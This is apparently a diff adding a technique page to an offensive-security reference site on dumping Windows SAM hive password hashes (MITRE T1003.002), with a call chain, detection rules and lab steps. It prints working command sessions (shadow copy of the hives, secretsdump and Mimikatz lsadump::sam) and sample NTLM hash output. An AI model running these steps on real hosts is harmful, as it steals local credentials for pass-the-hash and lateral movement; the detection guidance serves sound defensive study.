@@ -1,0 +1,171 @@
+---
+title: SAM Dump
+mitre: T1003.002
+category: credential-access
+group: Credential Stores
+summary: Extract local account NTLM hashes from the Security Account Manager registry files for offline use.
+platform: [Windows]
+tags: ['Python', 'PowerShell', 'SAM', 'Offline']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: Copy SYSTEM, SAM and SECURITY
+    desc: The live hives are locked; take offline copies from %SystemRoot%\System32\config or a VSS snapshot.
+    dll: kernel32
+  - call: Read the Boot Key from SYSTEM
+    desc: The Select values identify the current registry control set used to derive the key.
+    dll: '-'
+  - call: Decrypt the Password Encryption Key
+    desc: The PEK in SECURITY unwraps the encrypted hash blobs stored in the SAM hive.
+    dll: '-'
+  - call: Parse the SAM hive
+    desc: Recover LM and NT hashes for local accounts, including the local administrator.
+    dll: '-'
+detections:
+  - src: SYSMON EID 11
+    text: A non-system process reads or copies SAM, SYSTEM or SECURITY from the Windows system config directory.
+  - src: BEHAVIOURAL
+    text: Mimikatz lsadump::sam or impacket secretsdump LOCAL in a process command line.
+  - src: VSS
+    text: A shadow copy is created and then a read of the SAM hive follows from the snapshot path.
+  - src: WINDOWS EID 4656
+    text: A handle to the SAM file is opened by an account outside the local system or backup operators.
+related:
+  - mitre: T1003.003
+    title: NTDS.dit Extraction
+    desc: The domain-wide equivalent; SAM holds local accounts, NTDS holds the domain.
+    href: /techniques/credential-access/ntds-dit
+  - mitre: T1003.001
+    title: LSASS Memory Dump
+    desc: The live-memory alternative for hashes currently in use on the host.
+    href: /techniques/credential-access/lsass-memory-dump
+  - mitre: T1550.002
+    title: Pass the Hash
+    desc: The local NT hash extracted here can authenticate without the plaintext password.
+    href: /techniques/credential-access/pass-the-hash
+  - mitre: T1003.006
+    title: DCSync
+    desc: Pulls domain hashes remotely; SAM is the local, file-based sibling.
+    href: /techniques/credential-access/dcsync
+labKit:
+  - label: impacket secretsdump.py
+    href: 'https://github.com/fortra/impacket'
+  - label: DSInternals PowerShell module
+    href: 'https://github.com/MichaelGrafnetter/DSInternals'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+The Security Account Manager (SAM) is the local credential database on a Windows host. It stores
+the password hashes for accounts that exist on that machine - the built-in `Administrator`, any
+local admin, and any user created in the local user manager. It does not store domain accounts;
+for those, the equivalent store is the [NTDS.dit](/techniques/credential-access/ntds-dit) on a
+domain controller.
+
+Because the SAM hive is locked while the system is running, the standard extraction path is to
+take an offline copy of the `SAM`, `SYSTEM` and `SECURITY` registry hives and parse them away
+from the target. The `SYSTEM` hive holds the Boot Key, and the `SECURITY` hive holds the Password
+Encryption Key (PEK); together they decrypt the hash blobs in `SAM`. The result is a list of LM
+and NT hashes for every local account on the box.
+
+<Callout type="note">
+  A SAM dump is a local-account technique. It is the right move when the goal is the local
+  administrator on that specific host - for lateral movement, persistence, or cracking a reused
+  password. It will not return domain account hashes, and it will not return a currently logged-on
+  domain session the way an [LSASS dump](/techniques/credential-access/lsass-memory-dump) would.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+The offline path below takes the hives from a shadow copy and parses them with impacket. The
+VSS step is what generates the loud event; the parsing itself happens on the analyst box.
+
+<CodeBlock
+  file="sam_dump.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# create a shadow copy of the system volume
+$ vssadmin create shadow /for=C:
+Shadow Copy ID: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
+
+# copy the three hives from the snapshot
+$ copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM     C:\\Temp\\
+$ copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM  C:\\Temp\\
+$ copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY C:\\Temp\\
+
+# parse offline - no live handle to any process
+$ python3 secretsdump.py -sam C:\\Temp\\SAM -system C:\\Temp\\SYSTEM -security C:\\Temp\\SECURITY LOCAL
+
+[*] Target system bootKey: 0x3c2a...
+Local accounts:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+jsmith:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`}
+/>
+
+The same hives can be parsed on the target with Mimikatz, which skips the copy step but leaves
+the tool running where the analyst does not want it to be.
+
+<CodeBlock
+  file="sam_mimikatz.txt"
+  label="Mimikatz"
+  lang="text"
+  class="mb-7.5"
+  code={`mimikatz # privilege::debug
+mimikatz # lsadump::sam
+
+ SAM
+ *
+User:Administrator  RID:000000000500
+  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
+  Hash SHA1: ...
+User:jsmith        RID:000000001104
+  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b`}
+/>
+
+## Verifying in the lab
+
+Run the parse against a known local account and confirm the NT hash matches what the account
+password derives to. On a clean Windows install the built-in `Administrator` is disabled, so
+create a local admin with a known password first, then dump and compare.
+
+<CodeBlock
+  file="verify"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`> net user labadmin P@ssw0rd123 /add
+> net localgroup administrators labadmin /add
+
+# dump and parse; the RID 1000+ entry is the new account
+# its NT hash should match the offline derivation of P@ssw0rd123  <-- the artifact`}
+/>
+
+## Detection
+
+The file access is the primary signal. The hives sit in a directory almost nothing touches, and
+a read of `SAM` from a non-system process is a strong indicator on its own.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the EID 11 rule on the config directory is the cheapest continuous control and catches
+both the VSS path and a direct copy. The VSS correlation is higher fidelity and separates the
+SAM extraction from a routine shadow copy taken by backup software. The command-line behavioural
+rule is a fast triage filter but only fires where the tool leaves its name in the process
+command line.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
